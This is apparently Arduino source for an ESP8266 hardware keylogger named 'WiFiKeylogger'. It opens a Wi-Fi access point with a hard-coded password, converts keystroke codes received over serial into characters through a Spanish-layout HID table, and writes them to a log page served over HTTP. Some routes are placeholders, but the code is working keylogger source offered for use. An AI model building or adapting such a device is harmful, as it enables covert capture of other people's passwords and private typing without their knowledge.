#include <ESP8266WiFi.h>
#include <FS.h>
#include <ESP8266mDNS.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>
//#include <SPIFFSEditor.h>
#include <EEPROM.h>

#define BAUD_RATE 115200
#define SHIFT 0x80
#define ALTGR 0x40

const String delete_logs = "<a href=\"/delete\"><- DELETE LOGS</a><br><br></body></html>";

String data;
//int j = 0;
int tmp_incoming;
char data2[20];

uint8_t _asciimap[256] =
{
  0x00,             // NUL
  0x00,             // SOH
  0x00,             // STX
  0x00,             // ETX
  0x00,             // EOT
  0x00,             // ENQ
  0x00,             // ACK
  0x00,             // BEL
  0x2a,      // BS  Backspace
  0x2b,      // TAB  Tab
  0x28,      // LF  Enter
  0x00,             // VT
  0x00,             // FF
  0x00,             // CR
  0x00,             // SO
  0x00,             // SI
  0x00,             // DEL
  0x00,             // DC1
  0x00,             // DC2
  0x00,             // DC3
  0x00,             // DC4
  0x00,             // NAK
  0x00,             // SYN
  0x00,             // ETB
  0x00,             // CAN
  0x00,             // EM
  0x00,             // SUB
  0x00,             // ESC
  0x00,             // FS
  0x00,             // GS
  0x00,             // RS
  0x00,             // US
  0x2c,          //  ' ' (space)
  0x1e|SHIFT,    // !
  0x1f|SHIFT,    // "
  0x20|ALTGR,    // #
  0x21|SHIFT,    // $
  0x22|SHIFT,    // %
  0x23|SHIFT,    // &
  0x2d,          // '
  0x25|SHIFT,    // (
  0x26|SHIFT,    // )
  0x30|SHIFT,    // *
  0x30,          // +
  0x36,          // ,
  0x38,          // -
  0x37,          // .
  0x24|SHIFT,    // /
  0x27,          // 0
  0x1e,          // 1
  0x1f,          // 2
  0x20,          // 3
  0x21,          // 4
  0x22,          // 5
  0x23,          // 6
  0x24,          // 7
  0x25,          // 8
  0x26,          // 9
  0x37|SHIFT,      // :
  0x36|SHIFT,      // ;
  0x03,            // < //KEY_NON_US_100
  0x27|SHIFT,      // =
  0x03|SHIFT,      // > //KEY_NON_US_100 + SHIFT
  0x2d|SHIFT,      // ?
  0x1f|ALTGR,      // @
  0x04|SHIFT,      // A
  0x05|SHIFT,      // B
  0x06|SHIFT,      // C
  0x07|SHIFT,      // D
  0x08|SHIFT,      // E
  0x09|SHIFT,      // F
  0x0a|SHIFT,      // G
  0x0b|SHIFT,      // H
  0x0c|SHIFT,      // I
  0x0d|SHIFT,      // J
  0x0e|SHIFT,      // K
  0x0f|SHIFT,      // L
  0x10|SHIFT,      // M
  0x11|SHIFT,      // N
  0x12|SHIFT,      // O
  0x13|SHIFT,      // P
  0x14|SHIFT,      // Q
  0x15|SHIFT,      // R
  0x16|SHIFT,      // S
  0x17|SHIFT,      // T
  0x18|SHIFT,      // U
  0x19|SHIFT,      // V
  0x1a|SHIFT,      // W
  0x1b|SHIFT,      // X
  0x1c|SHIFT,      // Y
  0x1d|SHIFT,      // Z
  0x2f|ALTGR,      // [
  0x35|ALTGR,      // bslash
  0x30|ALTGR,      // ]
  0x2f|SHIFT,    // ^
  0x38|SHIFT,    // _
  0x2f,    // `
  0x04,          // a
  0x05,          // b
  0x06,          // c
  0x07,          // d
  0x08,          // e
  0x09,          // f
  0x0a,          // g
  0x0b,          // h
  0x0c,          // i
  0x0d,          // j
  0x0e,          // k
  0x0f,          // l
  0x10,          // m
  0x11,          // n
  0x12,          // o
  0x13,          // p
  0x14,          // q
  0x15,          // r
  0x16,          // s
  0x17,          // t
  0x18,          // u
  0x19,          // v
  0x1a,          // w
  0x1b,          // x
  0x1c,          // y
  0x1d,          // z
  0x34|ALTGR,    // {
  0x1e|ALTGR,    // |
  0x32|ALTGR,    // }
  0x21|ALTGR,    // ~
  0x00,        // DEL
  0x00,             // Ç Start extended ASCII
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,             // ç
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x33,             // ñ
  0x33|SHIFT,       // Ñ
  0x00,
  0x00,
  0x2e|SHIFT,       // ¿
  0x00,
  0x00,
  0x00,
  0x00,
  0x2e,             // ¡
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
};

/* ============= CHANGE WIFI CREDENTIALS ============= */
const char *ssid = "WiFiKeylogger";
const char *password = "hardwareKeylogger"; //min 8 chars
/* ============= ======================= ============= */

AsyncWebServer server(80);
FSInfo fs_info;
File logs;

void init_format() {
  logs.close();
  delay(1000);
  SPIFFS.format();
  logs = SPIFFS.open("/log.html", "a+");
  logs.println("<html><body><h2>WiFiKeylogger</h2><a class=\"myButton\" href=\"/delete\">Delete log</a><a class=\"myButton\" href=\"/configuration\">Configuration</a><p>Seleccionar idioma: </p><form target=\"_blank\"><select name=\"list\"><option value=\"https://www.google.es\"> BE<option value=\"https://www.marca.com\"> CZ<option value=\"https://www.as.com\"> DA<option value=\"https://www.google.es\"> DE<option value=\"/en\"> EN<option value=\"/es\"> ES<option value=\"https://www.google.es\"> FI<option value=\"https://www.google.es\"> FR<option value=\"https://www.google.es\"> IT<option value=\"https://www.google.es\"> PT<option value=\"https://www.google.es\"> TR</select> <input type=button value=\"Apply\" onClick=\"top.location.href=this.form.list.options[this.form.list.selectedIndex].value\"></form><style>.myButton {background-color:#599bb3;-moz-border-radius:32px;-webkit-border-radius:32px;border-radius:32px;border:2px solid #29668f;display:inline-block;cursor:pointer;color:#ffffff;font-family:Courier New;font-size:17px;padding:5px 4px;text-decoration:none;}.myButton:hover {background-color:#ffffff;}.myButton:active {position:relative;top:1px;}</style>"); 
}

void setup() {
  
  Serial.begin(BAUD_RATE);
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid,password);
  
  EEPROM.begin(4096);
  SPIFFS.begin();
  
  MDNS.addService("http","tcp",80);

  init_format();
  
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/log.html", "text/html");
  });

  server.on("/configuration", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/plain", "Prueba de ventana de configuración");
  });

  server.on("/delete", HTTP_GET, [](AsyncWebServerRequest *request){
    init_format();
    request->send(200, "text/plain", "Logs cleared!");
  });

  server.on("/es", HTTP_GET, [](AsyncWebServerRequest *request){
    // Código keymap ES
    request->send(200, "text/plain", "Idioma español aplicado");
  });

  server.on("/en", HTTP_GET, [](AsyncWebServerRequest *request){
    // Código keymap ES
    request->send(200, "text/plain", "Idioma ingles aplicado");
  });
  
  server.begin();
}

void loop() {
    // logs.write(Serial.read());
    data = Serial.readStringUntil('\n');
    Serial.println("enter recibido");
    Serial.print(data);
    Serial.println("--TEST--");

    data.toCharArray(data2, data.length());
    tmp_incoming = atoi(data2);

    for (int i = 0; i < 255; i++) {
      if(_asciimap[i] == tmp_incoming) {
        logs.write(i);
      }
    }
}
